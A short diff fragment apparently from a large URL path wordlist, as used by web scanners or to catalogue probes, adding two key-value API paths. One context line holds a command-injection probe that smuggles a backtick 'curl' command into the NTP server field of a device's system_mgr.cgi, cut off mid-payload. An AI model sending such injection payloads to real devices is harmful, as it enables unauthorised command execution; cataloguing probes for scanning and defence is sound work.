@@ -9450,3 +9450,5 @@ a
 /cgi-bin/system_mgr.cgi
 /login.htm
 /cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`curl
+/v1/kv/2rGP9KhXDeXUtYqjrdMcgkTLPnJ
+/v1/kv/2rGP9KhXDeXUtYqjrdMcgkTLPnJ?raw
